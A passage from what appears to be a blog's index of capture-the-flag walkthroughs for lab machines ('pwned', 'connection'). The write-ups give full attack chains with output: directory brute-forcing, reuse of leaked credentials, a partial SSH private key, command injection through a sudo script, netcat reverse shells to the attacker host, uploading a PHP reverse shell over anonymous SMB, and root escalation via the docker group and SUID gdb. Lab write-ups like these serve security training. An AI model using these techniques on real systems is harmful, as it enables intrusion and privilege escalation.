2&amp;gt;&amp;amp;1 | tee nikto_P80.txt- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.56.19+ Target Hostname: 192.168.56.19+ Target Port: 80+ Start Time: 2021-12-22 05:18:51 (GMT-5)---------------------------------------------------------------------------+ Server: Apache/2.4.38 (Debian)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ OSVDB-3268: /nothing/: Directory indexing found.+ Entry &#39;/nothing/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)+ &quot;robots.txt&quot; contains 1 entry which should be manually viewed.+ Server may leak inodes via ETags, header found with file /, inode: bf9, size: 5a9c7ca4a3440, mtime: gzip+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD + OSVDB-3233: /icons/README: Apache default file found.+ 7916 requests: 0 error(s) and 9 item(s) reported on remote host+ End Time: 2021-12-22 05:19:09 (GMT-5) (18 seconds)---------------------------------------------------------------------------+ 1 host(s) testedFurther enumeration leads to another dead end:┌──(root💀kali)-[/opt/hackmyv/pwned]└─# curl 192.168.56.19/nothing/nothing.html &amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Nothing&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;i said nothing bro &amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;!--I said nothing here. you are wasting your time i don&#39;t lie--&amp;gt;&amp;lt;/body&amp;gt;Gobuster output has an intersting folder called /hidden_text┌──(root💀kali)-[/opt/hackmyv/pwned]└─# gobuster dir -u http://192.168.56.19:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,php.bak,bak,jsp &quot; -o gobuster_p80.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.56.19:80[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: bak,jsp,txt,html,php,php.bak[+] Expanded: true[+] Timeout: 10s===============================================================2021/12/22 05:20:37 Starting gobuster in directory enumeration mode===============================================================http://192.168.56.19:80/index.html (Status: 200) [Size: 3065]http://192.168.56.19:80/robots.txt (Status: 200) [Size: 41] http://192.168.56.19:80/nothing (Status: 301) [Size: 316] [--&amp;gt; http://192.168.56.19/nothing/]http://192.168.56.19:80/server-status (Status: 403) [Size: 278] http://192.168.56.19:80/hidden_text (Status: 301) [Size: 320] [--&amp;gt; http://192.168.56.19/hidden_text/] ===============================================================2021/12/22 05:23:32 Finished===============================================================We can see that there’s a dictionary for us called secret.dic.Let’s save the file and use gobuster again to see what we can find.└─# curl http://192.168.56.19/hidden_text/secret.dic &amp;gt;&amp;gt; files.txt/hacked/vanakam_nanba/hackerman.gif /facebook/whatsapp/instagram/pwned/pwned.com/pubg /cod/fortnite/youtube/kali.org/hacked.vuln/users.vuln/passwd.vuln/pwned.vuln/backup.vuln/.ssh/root/home┌──(root💀kali)-[/opt/hackmyv/pwned]└─# cat files.txt hackedvanakam_nanbahackerman.gif facebookwhatsappinstagrampwnedpwned.compubg codfortniteyoutubekali.orghacked.vulnusers.vulnpasswd.vulnpwned.vulnbackup.vuln.sshroothome┌──(root💀kali)-[/opt/hackmyv/pwned]└─# gobuster dir -u http://192.168.56.19:80 -w files.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,php.bak,bak,jsp &quot; ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.56.19:80[+] Method: GET[+] Threads: 100[+] Wordlist: files.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: bak,jsp,txt,html,php,php.bak[+] Expanded: true[+] Timeout: 10s===============================================================2021/12/22 05:27:41 Starting gobuster in directory enumeration mode===============================================================http://192.168.56.19:80/pwned.vuln (Status: 301) [Size: 319] [--&amp;gt; http://192.168.56.19/pwned.vuln/] ===============================================================2021/12/22 05:27:41 Finished=============================================================== Further enumeration shows the username and password!Great ! Looks like we can reuse the password for the FTP.┌──(root💀kali)-[/opt/hackmyv/pwned]└─# curl http://192.168.56.19/pwned.vuln/ &amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;login&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;div id=&quot;main&quot;&amp;gt; &amp;lt;h1&amp;gt; vanakam nanba. I hacked your login page too with advanced hacking method&amp;lt;/h1&amp;gt; &amp;lt;form method=&quot;POST&quot;&amp;gt; Username &amp;lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;text&quot; autocomplete=&quot;off&quot; required&amp;gt; Password &amp;lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;text&quot; required&amp;gt; &amp;lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;sub&quot;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;lt;?php// if (isset($_POST[&#39;submit&#39;])) {// $un=$_POST[&#39;username&#39;];// $pw=$_POST[&#39;password&#39;];//// if ($un==&#39;ftpuser&#39; &amp;amp;&amp;amp; $pw==&#39;B0ss_B!TcH&#39;) {// echo &quot;welcome&quot;// exit();// }// else // echo &quot;Invalid creds&quot;// }?&amp;gt;Shell as arianaEnumerating FTP for files and folder. We can find id_rsa used for SSH and also a note which is specified for ariana.┌──(root💀kali)-[/opt/hackmyv/pwned]└─# ftp 192.168.56.19Connected to 192.168.56.19.220 (vsFTPd 3.0.3)Name (192.168.56.19:kali): ftpuser331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; ls229 Entering Extended Passive Mode (|||47890|)150 Here comes the directory listing.drwxr-xr-x 2 0 0 4096 Jul 10 2020 share226 Directory send OKftp&amp;gt; cd share250 Directory successfully changed.ftp&amp;gt; ls229 Entering Extended Passive Mode (|||39232|)150 Here comes the directory listing.-rw-r--r-- 1 0 0 2602 Jul 09 2020 id_rsa-rw-r--r-- 1 0 0 75 Jul 09 2020 note.txt226 Directory send OK.ftp&amp;gt; get id_rsalocal: id_rsa remote: id_rsa229 Entering Extended Passive Mode (|||13929|)150 Opening BINARY mode data connection for id_rsa (2602 bytes).100% |*****************************************************************************************************************************| 2602 5.35 MiB/s 00:00 ETA226 Transfer complete.2602 bytes received in 00:00 (3.12 MiB/s)ftp&amp;gt; get note.txtlocal: note.txt remote: note.txt229 Entering Extended Passive Mode (|||46351|)150 Opening BINARY mode data connection for note.txt (75 bytes).100% |*****************************************************************************************************************************| 75 170.72 KiB/s 00:00 ETA226 Transfer complete.75 bytes received in 00:00 (97.78 KiB/s)┌──(root💀kali)-[/opt/hackmyv/pwned]└─# cat note.txt Wow you are here ariana won&#39;t happy about this note sorry ariana :( ──(root💀kali)-[/opt/hackmyv/pwned]└─# cat id_rsa -----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAthncqHSPVcE7xs136G/G7duiV6wULU+1Y906aF3ltGpht/sXByPBaEzxOfqRXlQfkk7hpSYk8FCAibxddTGkd5YpcSH7U145sc2n7jwv0swjMu1ml+B5Vra7JJLet’s SSH into the server as ariana.──(root💀kali)-[/opt/hackmyv/pwned]└─# ssh ariana@192.168.56.19 -i id_rsa The authenticity of host &#39;192.168.56.19 (192.168.56.19)&#39; can&#39;t be established.ED25519 key fingerprint is SHA256:Eu7UdscPxuaxyzophLkeILniUaKCge0R96HjWhAmpyk.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;192.168.56.19&#39; (ED25519) to the list of known hosts.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0644 for &#39;id_rsa&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key &quot;id_rsa&quot;: bad permissionsariana@192.168.56.19&#39;s password: Look’s like the permissions are too open.──(root💀kali)-[/opt/hackmyv/pwned]└─# chmod 600 id_rsa ┌──(root💀kali)-[/opt/hackmyv/pwned]└─# ssh ariana@192.168.56.19 -i id_rsa Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70ariana@pwned:~$ whoamiarianaAwesome, we got in!Shell as selenaSudo configuration might allow a user to execute some command with another user privileges without knowing the password.In this case we can see /home/messenger.sh is able to be executed without password as selena. Looking through the file, it is a simple bash script which we can execute a linux command as selena because of $msg 2&amp;gt; /dev/null which takes in our input.ariana@pwned:~$ sudo -lMatching Defaults entries for ariana on pwned: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser ariana may run the following commands on pwned: (selena) NOPASSWD: /home/messenger.shariana@pwned:/home$ ls -la /home/messenger.sh -rwxr-xr-x 1 root root 367 Jul 10 2020 /home/messenger.shariana@pwned:/home$ cat messenger.sh #!/bin/bashclearecho &quot;Welcome to linux.messenger &quot; echo &quot;&quot;users=$(cat /etc/passwd | grep home | cut -d/ -f 3) echo &quot;&quot;echo &quot;$users&quot; echo &quot;&quot;read -p &quot;Enter username to send message : &quot; name echo &quot;&quot;read -p &quot;Enter message for $name :&quot; msg echo &quot;&quot;echo &quot;Sending message to $name &quot;$msg 2&amp;gt; /dev/null echo &quot;&quot;echo &quot;Message sent to $name :) &quot; echo &quot;&quot;Let’s test to see if what we thought is trueariana@pwned:/home$ sudo -u selena /home/messenger.shWelcome to linux.messenger ariana:selena:ftpuser:Enter username to send message : testEnter message for test :ls -laSending message to test total 24drwxr-xr-x 5 root root 4096 Jul 10 2020 .drwxr-xr-x 18 root root 4096 Jul 6 2020 ..drwxrwx--- 4 ariana ariana 4096 Jul 10 2020 arianadrwxrwxrwx 3 root root 4096 Jul 9 2020 ftpuser-rwxr-xr-x 1 root root 367 Jul 10 2020 messenger.shdrwxrwx--- 3 selena root 4096 Jul 10 2020 selenaMessage sent to test :) Great, we can see that the command ls-la is executed. Let’s run a nc command to get back a reverse shell as selena.ariana@pwned:~$ Welcome to linux.messenger ariana:selena:ftpuser:Enter username to send message : testEnter message for test :nc -e /bin/sh 192.168.56.3 4242Sending message to test Catch the reverse shell:┌──(root💀kali)-[/opt/hackmyv/pwned]└─# nc -lvnp 4242 listening on [any] 4242 ...connect to [192.168.56.3] from (UNKNOWN) [192.168.56.19] whoamiselenapython3 -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39; $ whoamiwhoamiselenaWe are now selena!Shell as RootThis time I’ll use linpeas to enumrate.$ cd /tmpcd /tmp$ wget http://192.168.56.3:1235/linpeas.shwget http://192.168.56.3:1235/linpeas.sh--2021-12-23 20:25:04-- http://192.168.56.3:1235/linpeas.shConnecting to 192.168.56.3:1235... connected.HTTP request sent, awaiting response... 200 OKLength: 330173 (322K) [text/x-sh]Saving to: ‘linpeas.sh’linpeas.sh 100%[===================&amp;gt;] 322.43K --.-KB/s in 0.004s 2021-12-23 20:25:04 (89.7 MB/s) - ‘linpeas.sh’ saved [330173/330173]After running linpeas, this stick out to me.$ bash linpeas.sh bash linpeas.sh ........[+] All users &amp;amp; groups uid=0(root) gid=0(root) groups=0(root)uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)We are in a docker group!If you are inside a docker container or you have access to a user in the docker group, you could try to escape and escalate privileges:Sample command#List images to use onedocker images#Run the image mounting the host disk and chroot on itdocker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bashSo in turn it’ll be like this:$ docker images docker images REPOSITORY TAG IMAGE ID CREATED SIZEprivesc latest 09ae39f0f8fc 17 months ago 88.3MB&amp;lt;none&amp;gt; &amp;lt;none&amp;gt; e13ad046d435 17 months ago 88.3MBalpine latest a24bb4013296 19 months ago 5.57MBdebian wheezy 10fcec6d95c4 2 years ago 88.3MB$ docker run -it -v /:/host/ privesc chroot /host/ bashroot@445c9d840e51:~# whoami;idwhoami;idrootuid=0(root) gid=0(root) groups=0(root)Rooted!" }, { "title": "hackmyvm: connection", "url": "/posts/connection/", "categories": "hackmyvm, easyy", "tags": "SUID", "date": "2021-12-23 19:59:00 +0800", "snippet": "Overview Box Difficulty Link Easy hackmyvm Link Another easy box! This time, I’ll practice writing things in detail.ReconObjective : Find out all the open ports and do a nmap service scan.┌──(root💀kali)-[/opt/hackmyv/connection] └─# rustscan -a 192.168.56.20 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan [~] The config file is expected to be at &quot;/root/.rustscan.toml&quot; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 192.168.56.20:22 Open 192.168.56.20:80 Open 192.168.56.20:139 Open 192.168.56.20:445 4 open port. Port 22,80,139 and 445.nmap output shows the below:┌──(root💀kali)-[/opt/hackmyv/connection] └─# nmap -sV -sC -p 22,80,139,445 192.168.56.20 -o nmap.txt Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 01:50 EST Nmap scan report for 192.168.56.20 Host is up (0.00042s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA) | 256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA) |_ 256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Apache2 Debian Default Page: It works 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)MAC Address: 08:00:27:8B:A8:90 (Oracle VirtualBox virtual NIC)Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.9.5-Debian)| Computer name: connection| NetBIOS computer name: CONNECTION\\x00| Domain name: \\x00| FQDN: connection|_ System time: 2021-12-24T01:50:47-05:00 | smb2-time: | date: 2021-12-24T06:50:47|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.42 secondsLet’s enumerate further !HTTP - 80Nikto shows that there’s really nothing much to work on.┌──(root💀kali)-[/opt/hackmyv/connection]└─# nikto -ask=no -h 192.168.56.20:80 2&amp;gt;&amp;amp;1 | tee nikto_P80.txt- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.56.20+ Target Hostname: 192.168.56.20+ Target Port: 80+ Start Time: 2021-12-24 01:53:31 (GMT-5)---------------------------------------------------------------------------+ Server: Apache/2.4.38 (Debian)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 5aff148b501f6, mtime: gzip+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD + OSVDB-3233: /icons/README: Apache default file found.+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host+ End Time: 2021-12-24 01:54:24 (GMT-5) (53 seconds)---------------------------------------------------------------------------+ 1 host(s) testedLooks like there’s really nothing much basic the basic Apache2 Debian Default Page from index.html.┌──(root💀kali)-[/opt/hackmyv/connection]└─# gobuster dir -u http://192.168.56.20:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,php.bak,bak,jsp&quot; -o gobuster_p80.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.56.20:80[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php,php.bak,bak,jsp,txt,html[+] Expanded: true[+] Timeout: 10s===============================================================2021/12/24 01:54:09 Starting gobuster in directory enumeration mode===============================================================http://192.168.56.20:80/index.html (Status: 200) [Size: 10701]http://192.168.56.20:80/server-status (Status: 403) [Size: 278] ===============================================================2021/12/24 01:56:36 Finished=============================================================== Let’s skip this for now.SMB- TCP 139/445Enumerating Samba shows that the \\\\192.168.56.20\\IPC$ has anonymous read/write access!```bash──(root💀kali)-[/opt/hackmyv/connection] └─# nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-os-discovery.nse,smb-security-mode.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse 192.168.56.20 -p 139,445 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 01:58 EST Nmap scan report for 192.168.56.20 Host is up (0.00046s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds MAC Address: 08:00:27:8B:A8:90 (Oracle VirtualBox virtual NIC) Host script results: | smb-enum-shares: | account_used: &amp;lt;blank&amp;gt; | \\\\192.168.56.20\\IPC$: | Type: STYPE_IPC_HIDDEN | Comment: IPC Service (Private Share for uploading files) | Users: 1 | Max Users: &amp;lt;unlimited&amp;gt; | Path: C:\\tmp | Anonymous access: READ/WRITE | \\\\192.168.56.20\\print$: | Type: STYPE_DISKTREE | Comment: Printer Drivers | Users: 0 | Max Users: &amp;lt;unlimited&amp;gt; | Path: C:\\var\\lib\\samba\\printers | Anonymous access: &amp;lt;none&amp;gt; | \\\\192.168.56.20\\share: | Type: STYPE_DISKTREE| Comment: | Users: 0| Max Users: &amp;lt;unlimited&amp;gt;| Path: C:\\var\\www|_ Anonymous access: READ| smb-ls: Volume \\\\192.168.56.20\\share| SIZE TIME FILENAME| &amp;lt;DIR&amp;gt; 2020-09-23T01:48:39 .| &amp;lt;DIR&amp;gt; 2020-09-23T01:48:39 ..| &amp;lt;DIR&amp;gt; 2020-09-23T02:20:00 html| 10701 2020-09-23T01:48:45 html\\index.html|_|_smb-vuln-ms10-054: false| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_smb-vuln-ms10-061: false| smb-os-discovery: | OS: Windows 6.1 (Samba 4.9.5-Debian)| Computer name: connection| NetBIOS computer name: CONNECTION\\x00| Domain name: \\x00| FQDN: connection|_ System time: 2021-12-24T01:58:59-05:00 Nmap done: 1 IP address (1 host up) scanned in 5.78 secondsAfter enumerating we can see that the IPC$ folder hold the web directory files.┌──(root💀kali)-[/opt/hackmyv/connection]└─# smbclient //192.168.56.20/share Enter WORKGROUP\\root&#39;s password: Anonymous login successfulTry &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; dir . D 0 Tue Sep 22 21:48:39 2020 .. D 0 Tue Sep 22 21:48:39 2020 html D 0 Tue Sep 22 22:20:00 2020 7158264 blocks of size 1024. 5267640 blocks availablesmb: \\&amp;gt; cd htmlsmb: \\html\\&amp;gt; dir . D 0 Tue Sep 22 22:20:00 2020 .. D 0 Tue Sep 22 21:48:39 2020 index.html N 10701 Tue Sep 22 21:48:45 2020 7158264 blocks of size 1024. 5267640 blocks availableLet’s upload a test file to see if our test.html is upoladed onto the server as well. Creating test.xt┌──(root💀kali)-[/opt/hackmyv/connection]└─# echo &quot;hello world &quot; &amp;gt;&amp;gt; test.txt ┌──(root💀kali)-[/opt/hackmyv/connection]└─# cat test.txt hello world Upload file onto machine through smb anonymous connection.┌──(root💀kali)-[/opt/hackmyv/connection]└─# smbclient //192.168.56.20/shareEnter WORKGROUP\\root&#39;s password: Anonymous login successfulTry &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; cd html\\smb: \\html\\&amp;gt; put test.txt putting file test.txt as \\html\\test.txt (4.2 kb/s) (average 4.2 kb/s)smb: \\html\\&amp;gt; After checking, it does look like the file exist on the server! This means we can upload a .php reverse shell!┌──(root💀kali)-[/opt/hackmyv/connection]└─# curl http://192.168.56.20/test.txthello world Shell as www-dataLet’s upload a reverse shell:I usually use the one from this git repo : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php┌──(root💀kali)-[/opt/hackmyv/connection]└─# smbclient //192.168.56.20/share Enter WORKGROUP\\root&#39;s password: Anonymous login successfulTry &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; cd html\\smb: \\html\\&amp;gt; put php-reverse-shell.php putting file php-reverse-shell.php as \\html\\php-reverse-shell.php (2682.5 kb/s) (average 2682.6 kb/s)smb: \\html\\&amp;gt; Catching the reverse shell on our local machine┌──(root💀kali)-[/opt/hackmyv/connection]└─# nc -lvnp 1234 listening on [any] 1234 ...connect to [192.168.56.3] from (UNKNOWN) [192.168.56.20] 40256Linux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux 02:16:28 up 29 min, 0 users, load average: 0.00, 0.53, 3.08USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#39;t access tty; job control turned off$ whoamiwww-data$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;Further enumeration shows that there’s no wget , so I have to upload the linpeas.sh through SMB instead.$ which awk perl python python3 ruby gcc cc vi vim nmap find netcat nc wget tftp ftp php 2&amp;gt;/dev/nullwhich awk perl python python3 ruby gcc cc vi vim nmap find netcat nc wget tftp ftp php 2&amp;gt;/dev/null/usr/bin/awk/usr/bin/perl/usr/bin/python/usr/bin/python3/usr/bin/vi/usr/bin/find/usr/bin/php┌──(root💀kali)-[/opt/hackmyv/connection]└─# smbclient //192.168.56.20/share Enter WORKGROUP\\root&#39;s password: Anonymous login successfulTry &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; cd html\\smb: \\html\\&amp;gt; put linpeas.sh putting file linpeas.sh as \\html\\linpeas.sh (80606.7 kb/s) (average 80608.6 kb/s)smb: \\html\\&amp;gt; On the victim machine , transfer linpeas over.$ cd /var/www/htmlcd /var/www/html$ ls -lals -latotal 356drwxrwxrwx 2 root root 4096 Dec 24 02:21 .drwxr-xr-x 3 root root 4096 Sep 22 2020 ..-rwxrwxrwx 1 root root 10701 Sep 22 2020 index.html-rwxr--r-- 1 nobody nogroup 330173 Dec 24 02:21 linpeas.sh-rwxr--r-- 1 nobody nogroup 5494 Dec 24 02:15 php-reverse-shell.php-rwxr--r-- 1 nobody nogroup 13 Dec 24 02:06 test.txt$ cp linpeah.sh /tmpcp linpeah.sh /tmpcp: cannot stat &#39;linpeah.sh&#39;: No such file or directory$ cd linpeas.sh /tmpcd linpeas.sh /tmp/bin/sh: 19: cd: can&#39;t cd to linpeas.sh$ cp linpeas.sh /tmpcp linpeas.sh /tmpShell as Root$ bash linpeas.sh bash linpeas.sh…..════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════ [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid strings Not Found strace Not Found -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 63K Jul 27 2018 /usr/bin/passwd ---&amp;gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 44K Jul 27 2018 /usr/bin/newgrp ---&amp;gt; HP-UX_10.20 -rwsr-xr-x 1 root root 83K Jul 27 2018 /usr/bin/gpasswd -rwsr-xr-x 1 root root 44K Jul 27 2018 /usr/bin/chsh -rwsr-xr-x 1 root root 53K Jul 27 2018 /usr/bin/chfn ---&amp;gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 35K Jan 10 2019 /usr/bin/umount ---&amp;gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 63K Jan 10 2019 /usr/bin/su -rwsr-xr-x 1 root root 51K Jan 10 2019 /usr/bin/mount ---&amp;gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-sr-x 1 root root 7.7M Oct 14 2019 /usr/bin/gdb -rwsr-xr-x 1 root root 427K Jan 31 2020 /usr/lib/openssh/ssh-keysign -rwsr-xr-- 1 root messagebus 50K Jul 5 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helperWe can see that gdb can be executed as root!Explanation : This mean that it has setuid (SUID) bit. When set, files will get executed with the privileges of the file owner.Reading from https://gtfobins.github.io/gtfobins/gdb/#suid , we can see that to exploit this we can execute the command to run GDB as root and run a bash shell.$ gdb -nx -ex &#39;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39; -ex quitgdb -nx -ex &#39;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39; -ex quitGNU gdb (Debian 8.2.1-2+b3) 8.2.1Copyright (C) 2018 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Type &quot;show copying&quot; and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.Find the GDB manual and other documentation resources online at: &amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.# whoamiwhoamiroot# ididuid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)Rooted!" }, { "title": "Hacksudo: search", "url": "/posts/Hacksudo_Search/", "categories": "Vulnhub, easy", "tags": "Path Variable", "date": "2021-05-16 20:00:00 +0800", "snippet": "Overview Box Difficulty Link Easy Vulnhub Link For this box I downloaded it off vulnhub and run it on my network!ReconLet’s start begin with our standard enumeration process to find out all the open ports.This time let’s use nmap to find all open ports┌──(root💀kali)-[~]└─# nmap 192.168.56.8 -p- Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 02:08 EDTNmap scan report for 192.168.56.8Host is up (0.00016s latency).Not shown: 65533 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:2F:78:D3 (Oracle VirtualBox virtual NIC)└─# nmap -sV -sC -p 22,80 192.168.56.8 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 02:09 EDTNmap scan report for 192.168.56.8Host is up (0.00026s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 7b:44:7c:da:fb:e5:e6:1d:76:33:eb:fa:c0:dd:77:44 (RSA)| 256 13:2d:45:07:32:83:13:eb:4e:a1:20:f4:06:ba:26:8a (ECDSA)|_ 256 